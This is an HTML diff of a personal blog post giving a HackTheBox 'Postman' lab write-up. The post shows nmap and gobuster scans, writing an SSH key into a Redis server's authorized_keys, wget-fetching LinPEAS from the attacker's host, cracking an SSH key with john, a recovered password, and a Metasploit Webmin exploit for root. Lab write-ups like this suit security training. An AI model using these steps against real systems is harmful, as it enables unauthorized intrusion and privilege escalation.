@@ -1,148 +1,191 @@
 <!DOCTYPE html>
 <html lang="en">
-
   <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Language" content="en">
-
-    <meta name="author" content="Ajdin Trejić">
-    <meta name="description" content="Reconnaissance Let’s run a quick nmap scan as always.
-# nmap -sV -sC -O -oA nmap/initial 10.10.10.160 Short explanation:
--sV Version detection -sC Script scan -O Enable OS detection -oA Output to all formats For a more detailed explanation click here.
-While I wait for this to be finished I’ll start a full nmap scan.
-# nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160 As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.">
-    <meta name="keywords" content="blog,developer,personal,write-up">
-
-    <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HackTheBox :: Postman Write Up"/>
-<meta name="twitter:description" content="Reconnaissance Let’s run a quick nmap scan as always.
+    
+      <title>HackTheBox Postman Write Up :: Ajdin Trejić — Ajdin&#39;s blog about stuff</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Reconnaissance Let’s run a quick nmap scan as always.
 # nmap -sV -sC -O -oA nmap/initial 10.10.10.160 Short explanation:
 -sV Version detection -sC Script scan -O Enable OS detection -oA Output to all formats For a more detailed explanation click here.
 While I wait for this to be finished I’ll start a full nmap scan.
 # nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160 As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages."/>
+<meta name="keywords" content="Infosec, information security, cybersecurity, security, web development, webdev"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/htb-postman/" />
 
-    <meta property="og:title" content="HackTheBox :: Postman Write Up" />
-<meta property="og:description" content="Reconnaissance Let’s run a quick nmap scan as always.
-# nmap -sV -sC -O -oA nmap/initial 10.10.10.160 Short explanation:
--sV Version detection -sC Script scan -O Enable OS detection -oA Output to all formats For a more detailed explanation click here.
-While I wait for this to be finished I’ll start a full nmap scan.
-# nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160 As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages." />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.min.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Postman Write Up"/>
+<meta name="twitter:description" content="This is a write up on how to gain root on HackTheBox Postman"/>
+
+
+
+<meta property="og:title" content="HackTheBox Postman Write Up" />
+<meta property="og:description" content="This is a write up on how to gain root on HackTheBox Postman" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ajdintrejic.github.io/posts/htb-postman/" />
+<meta property="og:url" content="/posts/htb-postman/" />
 <meta property="article:published_time" content="2020-03-13T13:28:11+02:00" />
-<meta property="article:modified_time" content="2020-03-13T13:28:11+02:00" />
+<meta property="article:modified_time" content="2020-03-13T13:28:11+02:00" /><meta property="og:site_name" content="Ajdin Trejić" />
 
 
-    
-      <base href="https://ajdintrejic.github.io/posts/htb-postman/">
-    
-    <title>
-  HackTheBox :: Postman Write Up · ajdintrejic
-</title>
 
-    
-      <link rel="canonical" href="https://ajdintrejic.github.io/posts/htb-postman/">
-    
 
-    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
 
-    
-      
-      
-      <link rel="stylesheet" href="https://ajdintrejic.github.io/css/coder.min.25dead06d06a3a86c2ff00e89506994da7e12f76d83f8cd22a40b144dc7ff1bd.css" integrity="sha256-Jd6tBtBqOobC/wDolQaZTafhL3bYP4zSKkCxRNx/8b0=" crossorigin="anonymous" media="screen" />
-    
 
-    
 
-    
 
-    
-      <link rel="stylesheet" href="https://ajdintrejic.github.io/css/codeFix.css" />
-    
-
-    
-
-    <link rel="icon" type="image/png" href="https://ajdintrejic.github.io/images/favicon-32x32.png" sizes="32x32">
-    <link rel="icon" type="image/png" href="https://ajdintrejic.github.io/images/favicon-16x16.png" sizes="16x16">
-
-    <meta name="generator" content="Hugo 0.73.0" />
   </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
 
-  
-  
-  <body class="colorscheme-light">
-    <main class="wrapper">
-      <nav class="navigation">
-  <section class="container">
-    <a class="navigation-title" href="https://ajdintrejic.github.io/">
-      ajdintrejic
-    </a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
     
-    <input type="checkbox" id="menu-toggle" />
-    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
-    <ul class="navigation-list">
       
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/about/">About</a>
-          </li>
+          <li><a href="/about">About</a></li>
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/posts/">Blog</a>
-          </li>
+      
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/projects/">Projects</a>
-          </li>
+          <li><a href="/categories/hackthebox">HTB</a></li>
         
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ajdintrejic.github.io/cv/">CV</a>
-          </li>
+      
+        
+          <li><a href="/cv">CV</a></li>
         
       
       
-    </ul>
     
-  </section>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/categories/hackthebox">HTB</a></li>
+      
+    
+      
+        <li><a href="/cv">CV</a></li>
+      
+    
+  </ul>
 </nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+<div class="padding">
+<div id="cookies-eu-banner" class="post" style="display: none;">
+    By continuing to visit this site, you accept the use of cookies for statistical purposes.
+    <a href="/privacy" id="cookies-eu-more">Read more</a>
+    
+	<div class="flex">
+    <button class="button" id="cookies-eu-accept">Accept</button>
+    </div>
+</div>
+</div>
 
 
       <div class="content">
         
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">HackTheBox :: Postman Write Up</h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fas fa-calendar"></i>
-              <time datetime='2020-03-13T13:28:11&#43;02:00'>
-                March 13, 2020
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fas fa-clock"></i>
-              4-minute read
-            </span>
-          </div>
-        </div>
-      </header>
+  
+  
 
-      <div>
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/htb-postman/">HackTheBox Postman Write Up</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-03-13
+        </span>
+
         
-          <img src='https://ajdintrejic.github.io/htb-postman/info_card.png' alt="Featured image"/>
+          
+        
+      
+
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/redis/">redis</a>&nbsp;
+        
+          #<a href="/tags/john/">john</a>&nbsp;
+        
+          #<a href="/tags/webmin/">webmin</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+        
+          <img src="/htb-postman/cover.jpg" alt="HackTheBox Postman Write Up" />
         
 
-	
-	  <hr>
-	  <h6 id="toc">Table of Contents</h6>
-	  <div> <nav id="TableOfContents">
+        
+      </figure>
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
   <ul>
     <li><a href="#reconnaissance">Reconnaissance</a></li>
     <li><a href="#getting-user-account">Getting user account</a>
@@ -157,33 +200,30 @@ While I wait for this to be finished I’ll start a full nmap scan.
       </ul>
     </li>
   </ul>
-</nav> </div>
-	  <hr>
-	
-
-
-        <h2 id="reconnaissance">Reconnaissance</h2>
+</nav></aside>
+      
+      <h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let’s run a quick nmap scan as always.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#60a0b0;font-style:italic"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
 </code></pre></div><p>Short explanation:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-sV Version detection
+<pre><code>-sV Version detection
 -sC Script scan
 -O  Enable OS detection 
 -oA Output to all formats
-</code></pre></div><p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
+</code></pre><p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
 <p>While I wait for this to be finished I’ll start a full nmap scan.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#60a0b0;font-style:italic"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-postman/nmap_initial.png" alt="nmap initial"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
+</code></pre></div><p><img src="/htb-postman/nmap_initial.png" alt="nmap initial"></p>
 <p>As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/port80.png" alt="port80"></p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/port10000_1.png" alt="port80"></p>
+<p><img src="/htb-postman/port80.png" alt="port80"></p>
+<p><img src="/htb-postman/port10000_1.png" alt="port80"></p>
 <p>Now on the second server I have to add a “s” to my http request so I can access that.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/port10000_2.png" alt="port80"></p>
+<p><img src="/htb-postman/port10000_2.png" alt="port80"></p>
 <p>I’ll also start up gobuster. On port 10000 every page link loads the same login so gobuster doesn’t help us there. Let’s run it on port 80.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#40a070">100</span>
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-postman/gobuster.png" alt="gobuster"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#ae81ff">100</span>
+</code></pre></div><p><img src="/htb-postman/gobuster.png" alt="gobuster"></p>
 <p>Now I felt kinda lost so I looked into what did the full nmap scan find.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/nmap_full.png" alt="nmap full"></p>
+<p><img src="/htb-postman/nmap_full.png" alt="nmap full"></p>
 <h2 id="getting-user-account">Getting user account</h2>
 <h3 id="redis-file-write">Redis file write</h3>
 <p>So we have something called Redis here running. I tried to find some explanation to what is it and how to exploit it, Google found this.</p>
@@ -191,86 +231,133 @@ While I wait for this to be finished I’ll start a full nmap scan.
 <p>The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”.</p>
 </blockquote>
 <p>So we’re on the right track. The developer guides us for the next steps on how to exploit this. Using <code>telnet</code> we can see now that we can connect to the machine easily:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#40a070">6379</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#ae81ff">6379</span>
 </code></pre></div><p>We don’t have a real shell here but we can write some files. We’ll write our own ssh keys. Let’s generate them.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/ssh_keygen.png" alt="nmap full"></p>
+<p><img src="/htb-postman/ssh_keygen.png" alt="nmap full"></p>
 <p>We will push the key and pad it before and after. Why? Well we’ll push it to Redis memory and then flush the memory to a file. The memory will contain a lot of garbage and we’re hoping ssh will parse the file, ignore the garbage and correctly read our key.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#666">(</span><span style="color:#007020">echo</span> -e <span style="color:#4070a0">&#34;\n\n&#34;</span>; cat id_rsa.pub; <span style="color:#007020">echo</span> -e <span style="color:#4070a0">&#34;\n\n&#34;</span><span style="color:#666">)</span> &gt; foo.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; foo.txt
 </code></pre></div><p>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using <code>redis-cli</code>:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
-$ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#007020">set</span> crackit
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
+$ cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
 </code></pre></div><p>Looks good. How to dump our memory content into the <code>authorized_keys</code> file? You can see what have I done in picture below.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/redis.png" alt="redis"></p>
+<p><img src="/htb-postman/redis.png" alt="redis"></p>
 <p>Now that we’ve got a shell, we can see by running</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
 </code></pre></div><p>that we have to gain access to Matt’s account.</p>
 <p>We can’t run anything as sudo and we don’t belong in any special groups. I searched the redis dir but there wasn’t anything we could work with, I went into <code>/var</code> and checked every folder and again, nothing we can work with. Let’s pull the big guns out. Big guns being LinPEAS. Let’s transfer them onto the server.</p>
 <p>Clone the repo to your machine, enter the <code>/linPEAS dir</code> and start an http server from there. I used port 1114.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#40a070">1114</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#ae81ff">1114</span>
 </code></pre></div><p>Now, navigate to <code>/tmp</code> and create a dir there and cd into it (e.g. <code>/tmp/1234</code>), then grab the file from the machine.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
 </code></pre></div><p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/id_rsa_bak.png" alt="id rsa bak"></p>
+<p><img src="/htb-postman/id_rsa_bak.png" alt="id rsa bak"></p>
 <h3 id="cracking-ssh-key-with-john">Cracking ssh key with John</h3>
 <p>Simply pipe this into ssh2john.py and crack it with the rockyou.txt wordlist.</p>
-<p><img src="https://ajdintrejic.github.io/htb-postman/john.png" alt="john"></p>
+<p><img src="/htb-postman/john.png" alt="john"></p>
 <p>I tried to ssh into the server with this key but no success. So I connected again as redis and ran</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
 </code></pre></div><p>And that’s how I got user</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
 517ad...
 </code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>Getting root is pretty easy, I just logged into webmin with <code>Matt</code> and <code>computer2008</code>. In there I couldn’t do anything, but we can see a notification that we have to update the software.</p>
 <h3 id="webmin-privilege-escalation">Webmin privilege escalation</h3>
 <p>I found an exploit on Metasploit and used it. Below are highlighted the options which are changed. Make sure to switch the payload as the default one didn’t work. I always have success in using the python one.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
- &gt; <span style="color:#007020">set</span> payload &lt;payload here&gt;
-</code></pre></div><p><img src="https://ajdintrejic.github.io/htb-postman/metasploit.png" alt="metasploit"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
+ &gt; set payload &lt;payload here&gt;
+</code></pre></div><p><img src="/htb-postman/metasploit.png" alt="metasploit"></p>
 <p>After this you can simply type <code>exploit</code> and you should have a shell as root and you can <code>cat root.txt</code>.</p>
 
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/htb-mango/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">HackTheBox Mango Write Up</span>
+                </a>
+              </span>
+            
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
       </div>
 
-
-      <footer>
-        
-
-
-        
-        
-        
-      </footer>
-    </article>
-
+      
+        <footer class="footer">
+  <div class="footer__inner">
     
-  </section>
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
 
+      <div class="copyright">
+
+        <span>© 2020  <a href="https://twitter.com/ajdintrejic" target="_blank" rel="noopener">Ajdin Trejić</a></span>
+        <span><a href="/privacy" target="_blank" rel="noopener">Privacy</a></span>
       </div>
+    
+  </div>
+</footer>
 
-      
-  <footer class="footer">
-    <section class="container">
-      
-      
-        ©
+
+
+
+
+<script src="/js/menu.js"></script>
+<script src="/js/theme.js"></script>
+<script src="/js/prism.js"></script>
+
+
+<script src="/cookies-eu-banner.js"></script>
+<script>
+    console.log("hello")
+    new CookiesEuBanner(function () {
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
         
-          2019 -
-        
-        2020
-         Ajdin Trejić 
-      
-      
-      
-    </section>
-  </footer>
+        ga('create', 'UA-XXXXXXXX-X', 'auto');
+        ga('send', 'pageview');
+    });
+</script>
 
-    </main>
+
+
+
+
+      
+    </div>
 
     
-
-    
-
-    
-
   </body>
-
 </html>
